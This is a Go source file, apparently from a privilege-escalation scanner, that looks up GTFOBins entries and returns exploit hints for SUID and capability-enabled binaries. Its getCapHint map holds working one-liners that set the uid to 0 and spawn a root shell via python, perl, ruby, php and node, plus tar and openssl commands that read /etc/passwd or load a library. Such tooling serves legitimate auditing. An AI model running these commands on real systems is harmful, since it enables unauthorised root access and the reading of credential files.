package scanners

import (
	_ "embed"
	"encoding/json"
	"path/filepath"
	"strings"
)

//go:embed gtfobins.json
var gtfobinsData []byte

// gtfobinsEntry mirrors the JSON structure produced by gen_gtfobins.py.
type gtfobinsEntry struct {
	SUID        bool   `json:"suid"`
	Sudo        bool   `json:"sudo"`
	Shell       bool   `json:"shell"`
	FileRead    bool   `json:"file_read"`
	FileWrite   bool   `json:"file_write"`
	LibraryLoad bool   `json:"library_load"`
	ExploitHint string `json:"exploit_hint"`
}

// gtfobinsDB is the parsed, in-memory lookup table. Loaded once at init.
var gtfobinsDB map[string]gtfobinsEntry

func init() {
	gtfobinsDB = make(map[string]gtfobinsEntry)
	// Unmarshal into a raw map first so we can lowercase keys safely.
	var raw map[string]gtfobinsEntry
	if err := json.Unmarshal(gtfobinsData, &raw); err != nil {
		// If the embedded JSON is malformed the binary still works —
		// lookups just return the zero-value (no match).
		return
	}
	for k, v := range raw {
		gtfobinsDB[strings.ToLower(k)] = v
	}
}

// LookupGTFOBin returns the GTFOBins entry for a binary name (case-insensitive).
// The second return value is false if the binary is not in the database.
func LookupGTFOBin(binaryName string) (gtfobinsEntry, bool) {
	entry, ok := gtfobinsDB[strings.ToLower(binaryName)]
	return entry, ok
}

// GetExploitHint returns a GTFOBins-style exploit command for a binary and vector.
// For the "suid" vector it first consults the embedded JSON, then falls back to
// the hand-written cap hints for the "capability" vector.
func GetExploitHint(path string, vector string) string {
	bin := strings.ToLower(filepath.Base(path))

	switch vector {
	case "suid":
		if entry, ok := gtfobinsDB[bin]; ok && entry.ExploitHint != "" {
			return entry.ExploitHint
		}
		return ""
	case "capability":
		return getCapHint(bin)
	}
	return ""
}

// getCapHint returns a capability-specific exploit hint.
// These are context-specific (require a particular Linux capability) so they
// are kept as a separate hand-curated map rather than derived from GTFOBins.
func getCapHint(bin string) string {
	hints := map[string]string{
		"python":  "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
		"perl":    "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
		"ruby":    "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
		"php":     "php -r \"posix_setuid(0); system('/bin/sh');\"",
		"node":    "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
		"tar":     "tar -cvf /tmp/passwd /etc/passwd (with cap_dac_read_search)",
		"openssl": "openssl req -engine /tmp/lib.so (with cap_sys_admin)",
	}
	return hints[bin]
}
